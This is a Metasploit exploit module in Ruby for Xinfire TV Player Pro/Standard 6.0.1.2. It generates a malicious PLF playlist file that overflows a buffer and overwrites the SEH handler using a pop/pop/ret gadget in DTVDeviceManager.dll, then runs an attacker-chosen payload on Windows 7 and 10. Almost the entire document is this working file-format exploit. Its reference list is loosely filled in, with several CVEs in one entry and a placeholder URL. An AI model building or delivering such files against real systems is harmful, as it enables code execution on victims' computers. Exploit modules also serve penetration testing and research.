##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  #Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking
  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'Xinfire TV Player',
      'Description'  => %q{
        The vulnerability is triggered when opening a malicious PLF file.How it works:open plf file on (playlist), and the vulnerability is triggered.
		This software is similar as Aviosoft Digital TV Player and BlazeVideo HDTV Player.This module has been tested successfully on Win7, Win10.
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'All the guys which found the vulnerability in Aviosoft Digital TV Player and BlazeVideo HDTV Player',  # Original discovery
		  'metacom27@gmail.com - twitter.@m3tac0m',
          'metacom',  # MSF Module
        ],
      'References'  =>
        [
          [ 'OSVDB', '77043' ],
          [ 'CVE', '2009-0450, 2006-6396, 2006-6199' ],
          [ 'URL', '<insert another link to the exploit/advisory here>' ]
        ],
      'DefaultOptions' =>
        {
          'ExitFunction' => 'process', #none/process/thread/seh
          #'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'  => 'win',
      'Payload'  =>
        {
          'BadChars' => "\x00\x0a\x0d\x1a\x2f\x3a\x5c", # <change if needed>
          'DisableNops' => true,
        },

      'Targets'    =>
        [
          [ ' Xinfire TV Player Pro and Standard V6.0.1.2 ',
            {
              'Ret'     =>  0x613018E9, # pop eax # pop esi # ret  - DTVDeviceManager.dll
              'Offset'  =>  608
            }
          ],
        ],
      'Privileged'  => false,
      #Correct Date Format: "M D Y"
      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec
      'DisclosureDate'  => 'Apr 15 2020',
      'DefaultTarget'  => 0))

    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.plf']),], self.class)

  end

  def exploit

    buffer = rand_text(target['Offset'])  #junk
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded  #1384 bytes of space
    # more junk may be needed to trigger the exception

    file_create(buffer)

  end
end
